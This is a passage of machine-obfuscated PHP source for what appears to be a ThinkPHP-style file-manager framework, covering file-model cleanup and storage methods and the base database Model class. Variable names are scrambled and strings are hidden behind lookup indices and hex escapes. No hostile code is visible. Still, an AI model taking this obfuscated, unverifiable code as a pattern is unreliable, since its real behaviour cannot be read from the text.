$Ò¥—ú÷ = array(); foreach ($¯úã¼ á as $•¸Åşíô => $÷¡›‰ÊÔ) { $´şû”° = $÷¡›‰ÊÔ . $¡•–Š·ã[12]; if (!$Ò¥—ú÷[$´şû”°]) { $Ò¥—ú÷[$´şû”°] = array(); } $Ò¥—ú÷[$´şû”°][] = $•¸Åşíô; } foreach ($Ò¥—ú÷ as $÷¡›‰ÊÔ => $Ü¼ƒ¿Ê’) { if (!$Ü¼ƒ¿Ê’) { continue; } $÷¡›‰ÊÔ = $õ¶¨ŸÓ» ? $÷¡›‰ÊÔ : -intval($÷¡›‰ÊÔ); $œôŸŞ è = array($¡•–Š·ã[468] => array($¡•–Š·ã[7], $Ü¼ƒ¿Ê’)); if ($÷¡›‰ÊÔ < 0) { $œôŸŞ è[$¡•–Š·ã[1931]] = array($¡•–Š·ã[1022], abs($÷¡›‰ÊÔ)); } $this->where($œôŸŞ è)->setAdd($¡•–Š·ã[1931], $÷¡›‰ÊÔ); } } public function findByHash($Ğ×æÓÕú, $ú×˜ššÑ = false) { $ìß…½«Ô =& $_SERVER[óó‹¸‚å]; if (!$Ğ×æÓÕú && !$ú×˜ššÑ) { return !1; } $€Â‹ÒŠ¼ = array($ìß…½«Ô[1925] => $Ğ×æÓÕú); if ($ú×˜ššÑ) { $€Â‹ÒŠ¼ = array($ìß…½«Ô[1926] => $ú×˜ššÑ); } return $this->order($ìß…½«Ô[1932])->where($€Â‹ÒŠ¼)->find(); } public function clearEmpty($‘øŞÊ×ø = 0) { $Œ²è´­¤ =& $_SERVER[óó‹¸‚å]; $ó³…Í¬Ü = time() - 3600 * 24 * $‘øŞÊ×ø; $ßñßğ›ñ = $Œ²è´­¤[1933] . $ó³…Í¬Ü; $¢ùœÎÙ¡ = $this->where($ßñßğ›ñ)->select(); if (!$¢ùœÎÙ¡) { return; } $ÜåºŒÒ× = new Task($Œ²è´­¤[1934], $Œ²è´­¤[12], count($¢ùœÎÙ¡)); foreach ($¢ùœÎÙ¡ as $˜’™Í·´) { $ÜåºŒÒ×->update(1); $this->resetFile($˜’™Í·´); } $ÜåºŒÒ×->end(); } public function resetFile($µ›­äå) { $¾§«˜ú¬ =& $_SERVER[óó‹¸‚å]; $˜ı´îŒ³ = array($¾§«˜ú¬[469] => $µ›­äå[$¾§«˜ú¬[468]]); $’•¬ûøØ = Model($¾§«˜ú¬[1343])->where($˜ı´îŒ³)->count(); $Ã“š† = Model($¾§«˜ú¬[1935])->where($˜ı´îŒ³)->count(); $à›–†™ = intval($’•¬ûøØ) + intval($Ã“š†); if ($à›–†™ == 0) { IO::remove($µ›­äå[$¾§«˜ú¬[84]]); Model($¾§«˜ú¬[1936])->delete($µ›­äå[$¾§«˜ú¬[468]]); $this->where($˜ı´îŒ³)->delete(); $this->metaSet($µ›­äå[$¾§«˜ú¬[468]], null, null); return; } if ($µ›­äå[$¾§«˜ú¬[1931]] != $à›–†™) { $this->where($˜ı´îŒ³)->save(array($¾§«˜ú¬[1924] => $à›–†™)); } } public function storageInfo($œ·ûÒş = false) { $Ş”«¨± =& $_SERVER[óó‹¸‚å]; $ª¯µ…Õ’ = $this->count() + 0.0; $µÀ¶ñÆ = 0; $šØ¡„Í¬ = 1; $É– çœµ = 0; $­òÇüôú = 5000; for ($Ÿçè“¬À = 0; $Ÿçè“¬À < $ª¯µ…Õ’; $Ÿçè“¬À = $Ÿçè“¬À + $­òÇüôú) { $ñ¥€èáç = $this->limit($Ÿçè“¬À, $Ÿçè“¬À + $­òÇüôú)->select(); foreach ($ñ¥€èáç as $î¾ÎÚæı) { $šØ¡„Í¬ += $î¾ÎÚæı[$Ş”«¨±[76]] * $î¾ÎÚæı[$Ş”«¨±[1931]]; $µÀ¶ñÆ += $î¾ÎÚæı[$Ş”«¨±[76]] * ($î¾ÎÚæı[$Ş”«¨±[1931]] - 1); $É– çœµ += $î¾ÎÚæı[$Ş”«¨±[1931]]; } } $øîşÃ¨‰ = array($Ş”«¨±[1937] => $šØ¡„Í¬, $Ş”«¨±[1938] => $µÀ¶ñÆ, $Ş”«¨±[1939] => $µÀ¶ñÆ / $šØ¡„Í¬, $Ş”«¨±[80] => $ª¯µ…Õ’, $Ş”«¨±[1940] => $É– çœµ); return $øîşÃ¨‰; } } goto bôÈš­Ñ³; FÑêËÉÎñŒ: class Model extends ClassBaseCall { private $_extModel = null; protected $db = null; protected $pk = "\x69\x64"; protected $tablePrefix = ''; protected $name = ''; protected $dbName = ''; protected $connection = ''; protected $tableName = ''; protected $trueTableName = ''; protected $error = ''; protected $fields = array(); protected $data = array(); protected $options = array(); protected $_validate = array(); protected $_auto = array(); protected $_map = array(); protected $_scope = array(); protected $autoCheckFields = true; protected $patchValidate = false; protected $methods = array("\164\141\x62\154\x65", "\157\x72\x64\x65\162", "\141\154\151\141\x73", "\x68\x61\166\x69\156\x67", "\x67\x72\x6f\165\160", "\x6c\157\x63\153", "\x64\x69\163\164\x69\x6e\143\x74", "\x61\165\x74\157", "\146\x69\x6c\x74\145\x72", "\166\x61\x6c\151\x64\141\164\x65", "\162\x65\163\165\x6c\x74", "\142\151\x6e\x64", "\x74\157\x6b\145\156"); public function __construct($İ’ú¶çñ = '', $ˆôş¼ëª = '', $ªğÇİâ» = '') { $¨Øëå—Ó =& $_SERVER[óó‹¸‚å]; $this->_initialize(); if (!empty($İ’ú¶çñ)) { if (strpos($İ’ú¶çñ, $¨Øëå—Ó[10])) { list($this->dbName, $this->name) = explode($¨Øëå—Ó[10], $İ’ú¶çñ); } else { $this->name = $İ’ú¶çñ; } } elseif (empty($this->name)) { $this->name = $this->getModelName(); } if (is_null($ˆôş¼ëª)) { $this->tablePrefix = $¨Øëå—Ó[12]; } elseif ($¨Øëå—Ó[12] != $ˆôş¼ëª) { $this->tablePrefix = $ˆôş¼ëª; } else { $this->tablePrefix = $this->tablePrefix ? $this->tablePrefix : think_config($¨Øëå—Ó[244]); } $this->db(0, empty($this->connection) ? $ªğÇİâ» : $this->connection); $this->_classObjectID = mt_rand(0, 10000); } protected function _checkTableInfo() { $ëâ´Ù‹ =& $_SERVER[óó‹¸‚å]; if (empty($this->fields)) { if (think_config($ëâ´Ù‹[245])) { $½ìÙğòö = $this->dbName ? $this->dbName : think_config($ëâ´Ù‹[246]); $¬”õâİ = think_var_cache($ëâ´Ù‹[247] . strtolower(get_path_this($½ìÙğòö) . $ëâ´Ù‹[10] . $this->name)); if ($¬”õâİ) { $ıÃ‰¾Æà = think_config($ëâ´Ù‹[248]); if (empty($ıÃ‰¾Æà) || $¬”õâİ[$ëâ´Ù‹[249]] == $ıÃ‰¾Æà) { $this->fields = $¬”õâİ; return; } } } $this->flush(); } } public function flush() { $Æ¿¯÷Ì =& $_SERVER[óó‹¸‚å]; $this->db->setModel($this->name); $ŸŒüû™© = $this->db->getFields($this->getTableName()); if (!$ŸŒüû™©) { return !1; } $this->fields = array_keys($ŸŒüû™©); $this->fields[$Æ¿¯÷Ì[250]] = !1; foreach ($ŸŒüû™© as $ªéÅıÎİ => $‡û‡æúŠ) { $åÉ½öÊË[$ªéÅıÎİ] = $‡û‡æúŠ[$Æ¿¯÷Ì[33]]; if ($‡û‡æúŠ[$Æ¿¯÷Ì[39]]) { $this->fields[$Æ¿¯÷Ì[251]] = $ªéÅıÎİ; if ($‡û‡æúŠ[$Æ¿¯÷Ì[42]]) { $this->fields[$Æ¿¯÷Ì[250]] = !0; } } } $this->fields[$Æ¿¯÷Ì[252]] = $åÉ½öÊË; if (think_config($Æ¿¯÷Ì[248])) { $this->fields[$Æ¿¯÷Ì[249]] = think_config($Æ¿¯÷Ì[248]); } if (think_config($Æ¿¯÷Ì[245])) { $ßâ´ê˜ª = $this->dbName ? $this->dbName : think_config($Æ¿¯÷Ì[246]); think_var_cache($Æ¿¯÷Ì[247] . strtolower(get_path_this($ßâ´ê˜ª) . $Æ¿¯÷Ì[10] . $this->name), $this->fields); } } public function switchModel($¦êÒ‘‹ª, $ŸïÎó› = array()) { $šÔô…ş© =& $_SERVER[óó‹¸‚å]; $µÊË¹Éü = ucwords(strtolower($¦êÒ‘‹ª)) . $šÔô…ş©[253]; if (!class_exists($µÊË¹Éü)) { think_exception($µÊË¹Éü . think_lang($šÔô…ş©[254])); } $this->_extModel = new $µÊË¹Éü($this->name); if (!empty($ŸïÎó›)) { foreach ($ŸïÎó› as $’Ã­–Àî) { $this->_extModel->setProperty($’Ã­–Àî, $this->{$’Ã­–Àî}); } } return $this->_extModel; } public function __set($¨ùáíüÊ, $÷…Ë¹û¤) { $this->data[$¨ùáíüÊ] = $÷…Ë¹û¤; } public function __get($×û£¸›) { return isset($this->data[$×û£¸›]) ? $this->data[$×û£¸›] : null; } public function __isset($—¢ƒŠš) { return isset($this->data[$—¢ƒŠš]); } public function __unset($ßªˆëéÄ) { unset($this->data[$ßªˆëéÄ]); } public function __call($š×¿Õ»í, $³Ğé¹¿ˆ) { $¿´¤†¹ì =& $_SERVER[óó‹¸‚å]; if (in_array(strtolower($š×¿Õ»í), $this->methods, !0)) { $this->options[strtolower($š×¿Õ»í)] = $³Ğé¹¿ˆ[0]; return $this; } elseif (in_array(strtolower($š×¿Õ»í), array($¿´¤†¹ì[255], $¿´¤†¹ì[256], $¿´¤†¹ì[257], $¿´¤†¹ì[258], $¿´¤†¹ì[259]), !0)) { $®Ï÷ÏÈú = isset($³Ğé¹¿ˆ[0]) ? $³Ğé¹¿ˆ[0] : $¿´¤†¹ì[188]; $®Ï÷ÏÈú = $this->db->parseKey($®Ï÷ÏÈú); return $this->getField(strtoupper($š×¿Õ»í) . $¿´¤†¹ì[260] . $®Ï÷ÏÈú . $¿´¤†¹ì[261] . $š×¿Õ»í, $¿´¤†¹ì[255]); } elseif (strtolower(substr($š×¿Õ»í, 0, 5)) == $¿´¤†¹ì[262]) { $®Ï÷ÏÈú = think_parse_name(substr($š×¿Õ»í, 5)); $Ç„ƒŒÒ[$®Ï÷ÏÈú] = $³Ğé¹¿ˆ[0]; return $this->where($Ç„ƒŒÒ)->find(); } elseif (strtolower(substr($š×¿Õ»í, 0, 10)) == $¿´¤†¹ì[263]) { $­˜Ä˜—º = think_parse_name(substr($š×¿Õ»í, 10)); $Ç„ƒŒÒ[$­˜Ä˜—º] = $³Ğé¹¿ˆ[0]; return $this->where($Ç„ƒŒÒ)->getField($³Ğé¹¿ˆ[1]); } elseif (isset($this->_scope[$š×¿Õ»í])) { return $this->scope($š×¿Õ»í, $³Ğé¹¿ˆ[0]); } elseif (method_exists($this, $š×¿Õ»í)) { array_unshift($³Ğé¹¿ˆ, $š×¿Õ»í); return call_user_func_array(array($this, $¿´¤†¹ì[264]), $³Ğé¹¿ˆ); } else { return call_user_func_array(array(parent, $š×¿Õ»í), $³Ğé¹¿ˆ); } } protected function call() { $ì÷¡ÚÀò =& $_SERVER[óó‹¸‚å]; $Ë®ßÅĞü = func_get_args(); $ªëÃ“¯¯ = array_shift($Ë®ßÅĞü); $·£Ô¸À = $ªëÃ“¯¯; if (is_array($ªëÃ“¯¯)) { $·£Ô¸À = $ªëÃ“¯¯[1]; $ªëÃ“¯¯ = $ªëÃ“¯¯[0]; } $æ¹’¾¥¬ = count($Ë®ßÅĞü) - 1; if (isset($Ë®ßÅĞü[$æ¹’¾¥¬]) && $Ë®ßÅĞü[$æ¹’¾¥¬] === $ªëÃ“¯¯) { think_exception(__CLASS__ . $ì÷¡ÚÀò[4] . $ªëÃ“¯¯ . think_lang($ì÷¡ÚÀò[265])); return; } $Ë®ßÅĞü[] = $ªëÃ“¯¯; if (method_exists($this, $ì÷¡ÚÀò[266])) { $½üêÖşü = call_user_func_array(array($this, $ì÷¡ÚÀò[267]), array($·£Ô¸À, $Ë®ßÅĞü)); if (!is_null($½üêÖşü) && $½üêÖşü !== !1) { return $½üêÖşü; } } $¶€ò–ç› = call_user_func_array(array($this, $ªëÃ“¯¯), $Ë®ßÅĞü); if (method_exists($this, $ì÷¡ÚÀò[268])) { $½üêÖşü = call_user_func_array(array($this, $ì÷¡ÚÀò[269]), array($·£Ô¸À, $Ë®ßÅĞü, $¶€ò–ç›)); if ($½üêÖşü) { return $½üêÖşü; } } return $¶€ò–ç›; } protected function _initialize() { } protected function _facade($ò²â­À) { $ù€âğÍô =& $_SERVER[óó‹¸‚å]; if (!empty($this->fields)) { foreach ($ò²â­À as $¼¨¼æÌ => $ı«„ì˜¦) { if (is_array($this->fields) && !in_array($¼¨¼æÌ, $this->fields, !0)) { unset($ò²â­À[$¼¨¼æÌ]); } elseif (is_scalar($ı«„ì˜¦)) { $this->_parseType($ò²â­À, $¼¨¼æÌ); } } } if (!empty($this->options[$ù€âğÍô[270]])) { $ò²â­À = array_map($this->options[$ù€âğÍô[270]], $ò²â­À); unset($this->options[$ù€âğÍô[270]]); } $this->_beforeWrite($ò²â­À); return $ò²â­À; } protected function _beforeWrite(&$–í§‡áû) { } public function add($²úÍÈı» = '', $¯ºÇíñÅ = array(), $‘¨ùÂÏ = false) { if (empty($²úÍÈı»)) { if (!empty($this->data)) { $²úÍÈı» = $this->data; $this->data = array(); } else { $this->error = think_lang($_SERVER[óó‹¸‚å][271]); return !1; } } $¯ºÇíñÅ = $this->_parseOptions($¯ºÇíñÅ); $²úÍÈı» = $this->_facade($²úÍÈı»); if (!1 === $this->_beforeInsert($²úÍÈı», $¯ºÇíñÅ)) { return !1; } $áÁ¥şçŠ = $this->db->insert($²úÍÈı», $¯ºÇíñÅ, $‘¨ùÂÏ); if (!1 !== $áÁ¥şçŠ) { $Ú¨ÃŞÖ¡ = $this->getLastInsID(); if ($Ú¨ÃŞÖ¡) { $²úÍÈı»[$this->getPk()] = $Ú¨ÃŞÖ¡; $this->_after_insert($²úÍÈı», $¯ºÇíñÅ); return $Ú¨ÃŞÖ¡; } $this->_after_insert($²úÍÈı», $¯ºÇíñÅ); } return $áÁ¥şçŠ; } protected function _beforeInsert(&$×Ê“åùé, $Ïø±ÈÎƒ) { } protected function _after_insert($‡ÈÃ‰Àß, $Ôä‚Äò­) { } public function addAll($ö›Éê™”, $ÃÃ¾ı = array(), $œ»ßÜÎ‘ = false) { $®·§Í¨Ù =& $_SERVER[óó‹¸‚å]; if (empty($ö›Éê™”)) { $this->error = think_lang($®·§Í¨Ù[271]); return !1; } $ÃÃ¾ı = $this->_parseOptions($ÃÃ¾ı); foreach ($ö›Éê™” as $¨Ùá· => $±¡›¦ğ²) { $ö›Éê™”[$¨Ùá·] = $this->_facade($±¡›¦ğ²); } if (method_exists($this->db, $®·§Í¨Ù[272])) { $îÚ°ËÚ = $this->db->insertAll($ö›Éê™”, $ÃÃ¾ı, $œ»ßÜÎ‘); } else { $this->startTrans(); foreach ($ö›Éê™” as $¨Ùá· => $±¡›¦ğ²) { $îÚ°ËÚ = $this->db->insert($±¡›¦ğ², $ÃÃ¾ı, $œ»ßÜÎ‘); } $this->commit(); } if (!1 !== $îÚ°ËÚ) { $ÇË´ú‘© = $this->getLastInsID(); if ($ÇË´ú‘©) { return $ÇË´ú‘©; } } return $îÚ°ËÚ; } public function selectAdd($Ì…Ë‘‚ = '', $Ì§ŠÉ£ü = '', $×‹øàé = array()) { $öå€‹°ù =& $_SERVER[óó‹¸‚å]; $×‹øàé = $this->_parseOptions($×‹øàé); if (!1 === ($æÒïû²Ã = $this->db->selectInsert($Ì…Ë‘‚ ? $Ì…Ë‘‚ : $×‹øàé[$öå€‹°ù[273]], $Ì§ŠÉ£ü ? $Ì§ŠÉ£ü : $this->getTableName(), $×‹øàé))) { $this->error = think_lang($öå€‹°ù[274]); return !1; } else { return $æÒïû²Ã; } } public function save($Ã¨Ä­ = '', $Ñüîô­å = array()) { $å´’Ï÷ê =& $_SERVER[óó‹¸‚å]; if (empty($Ã¨Ä­)) { if (!empty($this->data)) { $Ã¨Ä­ = $this->data; $this->data = array(); } else { $this->error = think_lang($å´’Ï÷ê[271]); return !1; } } $Ã¨Ä­ = $this->_facade($Ã¨Ä­); $Ñüîô­å = $this->_parseOptions($Ñüîô­å); $¹ï½Š¥¸ = $this->getPk(); if (!isset($Ñüîô­å[$å´’Ï÷ê[275]])) { if (isset($Ã¨Ä­[$¹ï½Š¥¸])) { $®ò‡ğ…¢[$¹ï½Š¥¸] = $Ã¨Ä­[$¹ï½Š¥¸]; $Ñüîô­å[$å´’Ï÷ê[275]] = $®ò‡ğ…¢; unset($Ã¨Ä­[$¹ï½Š¥¸]); } else { $this->error = think_lang($å´’Ï÷ê[274]); return !1; } } if (is_array($Ñüîô­å[$å´’Ï÷ê[275]]) && isset($Ñüîô­å[$å´’Ï÷ê[275]][$¹ï½Š¥¸])) { $Ğ‡İ¹äõ = $Ñüîô­å[$å´’Ï÷ê[275]][$¹ï½Š¥¸]; } if (!1 === $this->_beforeUpdate($Ã¨Ä­, $Ñüîô­å)) { return !1; } $«Ì¦İ˜¹ = $this->db->update($Ã¨Ä­, $Ñüîô­å); if (!1 !== $«Ì¦İ˜¹) { if (isset($Ğ‡İ¹äõ)) { $Ã¨Ä­[$¹ï½Š¥¸] = $Ğ‡İ¹äõ; } $this->_afterUpdate($Ã¨Ä­, $Ñüîô­å); } return $«Ì¦İ˜¹; } protected function _beforeUpdate(&$Óüæ¡«, $–­‡ïˆ) { } protected function _afterUpdate($ƒÀ¤ñÍ€, $õÊèìø) { } public function delete($ˆÇ¨ËùÏ = array()) { $íşóÅ·’ =& $_SERVER[óó‹¸‚å]; if (empty($ˆÇ¨ËùÏ) && empty($this->options[$íşóÅ·’[275]])) { if (!empty($this->data) && isset($this->data[$this->getPk()])) { return $this->delete($this->data[$this->getPk()]); } else { return !1; } } $ôÆËÈ›Ë = $this->getPk(); if (is_numeric($ˆÇ¨ËùÏ) || is_string($ˆÇ¨ËùÏ)) { if (strpos($ˆÇ¨ËùÏ, $íşóÅ·’[50])) { $‡ê¤à‚‰[$ôÆËÈ›Ë] = array($íşóÅ·’[276], $ˆÇ¨ËùÏ); } else { $‡ê¤à‚‰[$ôÆËÈ›Ë] = $ˆÇ¨ËùÏ; } $this->options[$íşóÅ·’[275]] = $‡ê¤à‚‰; } $ˆÇ¨ËùÏ = $this->_parseOptions(); if (is_array($ˆÇ¨ËùÏ[$íşóÅ·’[275]]) && isset($ˆÇ¨ËùÏ[$íşóÅ·’[275]][$ôÆËÈ›Ë])) { $Ê¾öí£ = $ˆÇ¨ËùÏ[$íşóÅ·’[275]][$ôÆËÈ›Ë]; } $Œ·ù¸¥Ñ = $this->db->delete($ˆÇ¨ËùÏ); if (!1 !== $Œ·ù¸¥Ñ) { $¦Ÿê“ˆ = array(); if (isset($Ê¾öí£)) { $¦Ÿê“ˆ[$ôÆËÈ›Ë] = $Ê¾öí£; } $this->_after_delete($¦Ÿê“ˆ, $ˆÇ¨ËùÏ); } return $Œ·ù¸¥Ñ; } protected function _after_delete($Ë±ôº¾, $ÕÈŒÖòë) { } public function select($¤âóÒÑŠ = array()) { $ë¯ñ™ÁÜ =& $_SERVER[óó‹¸‚å]; if (is_string($¤âóÒÑŠ) || is_numeric($¤âóÒÑŠ)) { $Şî÷µ•÷ = $this->getPk(); if (strpos($¤âóÒÑŠ, $ë¯ñ™ÁÜ[50])) { $ø¢±Û[$Şî÷µ•÷] = array($ë¯ñ™ÁÜ[276], $¤âóÒÑŠ); } else { $ø¢±Û[$Şî÷µ•÷] = $¤âóÒÑŠ; } $this->options[$ë¯ñ™ÁÜ[275]] = $ø¢±Û; } elseif (!1 === $¤âóÒÑŠ) { $¤âóÒÑŠ = $this->_parseOptions(); return $ë¯ñ™ÁÜ[277] . $this->db->buildSelectSql($¤âóÒÑŠ) . $ë¯ñ™ÁÜ[278]; } $¤âóÒÑŠ = $this->_parseOptions(); $ä‹³˜ìé = $this->db->select($¤âóÒÑŠ); if (!1 === $ä‹³˜ìé) { return !1; } if (empty($ä‹³˜ìé)) { return null; } $this->_afterSelect($ä‹³˜ìé, $¤âóÒÑŠ); return $ä‹³˜ìé; } protected function _afterSelect(&$æòÃ¼Ã, $öÆéÙœ•) { } public function buildSql($çùÛíğ = array()) { $¾³ÈÌñ¯ =& $_SERVER[óó‹¸‚å]; $çùÛíğ = $this->_parseOptions($çùÛíğ); return $¾³ÈÌñ¯[277] . $this->db->buildSelectSql($çùÛíğ) . $¾³ÈÌñ¯[278]; } public function optionsValue($åÓ˜™× = null) { if (is_null($åÓ˜™×)) { return $this->options; } elseif (is_array($åÓ˜™×)) { $this->options = array_merge($this->options, $åÓ˜™×); } } protected function _parseOptions($ÁÉİ¶Ç¶ = array()) { $É£¡Æ¸ =& $_SERVER[óó‹¸‚å]; if (is_array($ÁÉİ¶Ç¶)) { $ÁÉİ¶Ç¶ = array_merge($this->options, $ÁÉİ¶Ç¶); } $this->options = array(); if (!isset($ÁÉİ¶Ç¶[$É£¡Æ¸[279]])) { $ÁÉİ¶Ç¶[$É£¡Æ¸[279]] = $this->getTableName(); $ÓïÜ¦Õ = $this->fields; } else { $ÓïÜ¦Õ = $this->getDbFields(); } if (!empty($ÁÉİ¶Ç¶[$É£¡Æ¸[280]])) { $ÁÉİ¶Ç¶[$É£¡Æ¸[279]] .= $É£¡Æ¸[53] . $ÁÉİ¶Ç¶[$É£¡Æ¸[280]]; } $ÁÉİ¶Ç¶[$É£¡Æ¸[281]] = $this->name; if (isset($ÁÉİ¶Ç¶[$É£¡Æ¸[275]]) && is_array($ÁÉİ¶Ç¶[$É£¡Æ¸[275]]) && !empty($ÓïÜ¦Õ) && !isset($ÁÉİ¶Ç¶[$É£¡Æ¸[282]]) && !isset($ÁÉİ¶Ç¶[$É£¡Æ¸[279]])) { foreach ($ÁÉİ¶Ç¶[$É£¡Æ¸[275]] as $äâ€¦‰Í => $¶úå®¼) { $äâ€¦‰Í = trim($äâ€¦‰Í); if (in_array($äâ€¦‰Í, $ÓïÜ¦Õ, !0)) { if (is_scalar($¶úå®¼)) { $this->_parseType($ÁÉİ¶Ç¶[$É£¡Æ¸[275]], $äâ€¦‰Í); } } elseif (!is_numeric($äâ€¦‰Í) && $É£¡Æ¸[11] != substr($äâ€¦‰Í, 0, 1) && !1 === strpos($äâ€¦‰Í, $É£¡Æ¸[10]) && !1 === strpos($äâ€¦‰Í, $É£¡Æ¸[260]) && !1 === strpos($äâ€¦‰Í, $É£¡Æ¸[283]) && !1 === strpos($äâ€¦‰Í, $É£¡Æ¸[284])) { unset($ÁÉİ¶Ç¶[$É£¡Æ¸[275]][$äâ€¦‰Í]); } } } $this->_options_filter($ÁÉİ¶Ç¶); return $ÁÉİ¶Ç¶; } protected function _options_filter(&$ ÷©Îöƒ) { } protected function _parseType(&$Î‡Ş®¶Î, $‚¬ú¨Öı) { $ñ›ËùĞú =& $_SERVER[óó‹¸‚å]; if (empty($this->options[$ñ›ËùĞú[285]][$ñ›ËùĞú[4] . $‚¬ú¨Öı])) { $ÉóäÏ•‘ = strtolower($this->fields[$ñ›ËùĞú[252]][$‚¬ú¨Öı]); if (!1 !== strpos($ÉóäÏ•‘, $ñ›ËùĞú[286])) { } elseif (!1 === strpos($ÉóäÏ•‘, $ñ›ËùĞú[287]) && !1 !== strpos($ÉóäÏ•‘, $ñ›ËùĞú[288])) { $Î‡Ş®¶Î[$‚¬ú¨Öı] = intval($Î‡Ş®¶Î[$‚¬ú¨Öı]); } elseif (!1 !== strpos($ÉóäÏ•‘, $ñ›ËùĞú[289]) || !1 !== strpos($ÉóäÏ•‘, $ñ›ËùĞú[290])) { $Î‡Ş®¶Î[$‚¬ú¨Öı] = floatval($Î‡Ş®¶Î[$‚¬ú¨Öı]); } elseif (!1 !== strpos($ÉóäÏ•‘, $ñ›ËùĞú[291])) { $Î‡Ş®¶Î[$‚¬ú¨Öı] = (bool) $Î‡Ş®¶Î[$‚¬ú¨Öı]; } } } public function find($íÓŠ‡Úû = array()) { $èÔâ®è½ =& $_SERVER[óó‹¸‚å]; if (is_numeric($íÓŠ‡Úû) || is_string($íÓŠ‡Úû)) { $î¿ÜÉŞß[$this->getPk()] = intval($íÓŠ‡Úû); $this->options[$èÔâ®è½[275]] = $î¿ÜÉŞß; } $this->options[$èÔâ®è½[292]] = 1; $íÓŠ‡Úû = $this->_parseOptions(); $‚Åë§Ò = $this->db->select($íÓŠ‡Úû); if (!1 === $‚Åë§Ò) { return !1; } if (empty($‚Åë§Ò)) { return null; } $this->data = $‚Åë§Ò[0]; $this->_afterFind($this->data, $íÓŠ‡Úû); if (!empty($this->options[$èÔâ®è½[293]])) { return $this->returnResult($this->data, $this->options[$èÔâ®è½[293]]); } return $this->data; } protected function _afterFind(&$ìó¹ğ, $øü¶È€î) { } protected function returnResult($Àœ©úá, $ ı¸ø§— = '') { $ÑŒÜ½Ï¦ =& $_SERVER[óó‹¸‚å]; if ($ ı¸ø§—) { if (is_callable($ ı¸ø§—)) { return call_user_func($ ı¸ø§—, $Àœ©úá); } switch (strtolower($ ı¸ø§—)) { case $ÑŒÜ½Ï¦[294]: return json_encode($Àœ©úá); case $ÑŒÜ½Ï¦[295]: return xml_encode($Àœ©úá); } } return $Àœ©úá; } public function parseFieldsMap($‚»ÍÒ†§, $Õ¦½½À = 1) { if (!empty($this->_map)) { foreach ($this->_map as $Ó‡ò²¶ë => $«çæÁ…›) { if ($Õ¦½½À == 1) { if (isset($‚»ÍÒ†§[$«çæÁ…›])) { $‚»ÍÒ†§[$Ó‡ò²¶ë] = $‚»ÍÒ†§[$«çæÁ…›]; unset($‚»ÍÒ†§[$«çæÁ…›]); } } else { if (isset($‚»ÍÒ†§[$Ó‡ò²¶ë])) { $‚»ÍÒ†§[$«çæÁ…›] = $‚»ÍÒ†§[$Ó‡ò²¶ë]; unset($‚»ÍÒ†§[$Ó‡ò²¶ë]); } } } } return $‚»ÍÒ†§; } public function setField($ ïÀ³îò, $Ôù‘“Ë£ = '') { if (is_array($ ïÀ³îò)) { $‡³äÍÂş = $ ïÀ³îò; } else { $‡³äÍÂş[$ ïÀ³îò] = $Ôù‘“Ë£; } return $this->save($‡³äÍÂş); } public function setAdd($Ìˆ¿é÷°, $ìë…®„Ó = 1) { $×ú›Ïàì =& $_SERVER[óó‹¸‚å]; $¥ê—ß³¾ = $Ìˆ¿é÷° . $×ú›Ïàì[296] . $ìë…®„Ó; if ($ìë…®„Ó < 0) { $¥ê—ß³¾ = $Ìˆ¿é÷° . $ìë…®„Ó; } return $this->setField($Ìˆ¿é÷°, array($×ú›Ïàì[297], $¥ê—ß³¾)); } public function getField($é ©í­Ù, $Œñß–‘¡ = null) { $Í“¦á¨¾ =& $_SERVER[óó‹¸‚å]; $±üâ§[$Í“¦á¨¾[273]] = $é ©í­Ù; $±üâ§ = $this->_parseOptions($±üâ§); $é ©í­Ù = trim($é ©í­Ù); if (strpos($é ©í­Ù, $Í“¦á¨¾[50])) { if (!isset($±üâ§[$Í“¦á¨¾[292]])) { $±üâ§[$Í“¦á¨¾[292]] = is_numeric($Œñß–‘¡) ? $Œñß–‘¡ : $Í“¦á¨¾[12]; } $å÷ØüÁé = $this->db->select($±üâ§); if (!empty($å÷ØüÁé)) { $ÏÔ˜ÔÆó = explode($Í“¦á¨¾[50], $é ©í­Ù); $é ©í­Ù = array_keys($å÷ØüÁé[0]); $¾™â¡• = array_shift($é ©í­Ù); $ÈÍÔ‹»˜ = array_shift($é ©í­Ù); $·¦ûÑÓ = array(); $Ú™ûÒ—² = count($ÏÔ˜ÔÆó); foreach ($å÷ØüÁé as $Ä÷½Ü¢½) { $Ú”øø´Ö = $Ä÷½Ü¢½[$¾™â¡•]; if (2 == $Ú™ûÒ—²) { $·¦ûÑÓ[$Ú”øø´Ö] = $Ä÷½Ü¢½[$ÈÍÔ‹»˜]; } else { $·¦ûÑÓ[$Ú”øø´Ö] = is_string($Œñß–‘¡) ? implode($Œñß–‘¡, $Ä÷½Ü¢½) : $Ä÷½Ü¢½; } } return $·¦ûÑÓ; } } else { if (!0 !== $Œñß–‘¡) { $±üâ§[$Í“¦á¨¾[292]] = is_numeric($Œñß–‘¡) ? $Œñß–‘¡ : 1; } if ($Œñß–‘¡ === $Í“¦á¨¾[255]) { unset($±üâ§[$Í“¦á¨¾[292]]); } $Ä÷½Ü¢½ = $this->db->select($±üâ§); if (!empty($Ä÷½Ü¢½)) { if ($Œñß–‘¡ === $Í“¦á¨¾[255]) { return reset($Ä÷½Ü¢½[0]); } if (!0 !== $Œñß–‘¡ && 1 == $±üâ§[$Í“¦á¨¾[292]]) { return reset($Ä÷½Ü¢½[0]); } foreach ($Ä÷½Ü¢½ as $¬ÂÄ¾¼ê) { $´»Ò”ç¯[] = $¬ÂÄ¾¼ê[$é ©í­Ù]; } return $´»Ò”ç¯; } } return null; } public function create($œ½ÍÔíá = '', $Øæ°ü¹¨ = '') { $ÎıùÛ¯Î =& $_SERVER[óó‹¸‚å]; if (empty($œ½ÍÔíá)) { $œ½ÍÔíá = $_POST; } elseif (is_object($œ½ÍÔíá)) { $œ½ÍÔíá = get_object_vars($œ½ÍÔíá); } if (empty($œ½ÍÔíá) || !is_array($œ½ÍÔíá)) { $this->error = think_lang($ÎıùÛ¯Î[271]); return !1; } $œ½ÍÔíá = $this->parseFieldsMap($œ½ÍÔíá, 0); $Øæ°ü¹¨ = $Øæ°ü¹¨ ? $Øæ°ü¹¨ : (!empty($œ½ÍÔíá[$this->getPk()]) ? THINK_MODEL_UPDATE : THINK_MODEL_INSERT); if (isset($this->options[$ÎıùÛ¯Î[273]])) { $ÏßÊØ¢ = $this->options[$ÎıùÛ¯Î[273]]; unset($this->options[$ÎıùÛ¯Î[273]]); } elseif ($Øæ°ü¹¨ == THINK_MODEL_INSERT && isset($this->insertFields)) { $ÏßÊØ¢ = $this->insertFields; } elseif ($Øæ°ü¹¨ == THINK_MODEL_UPDATE && 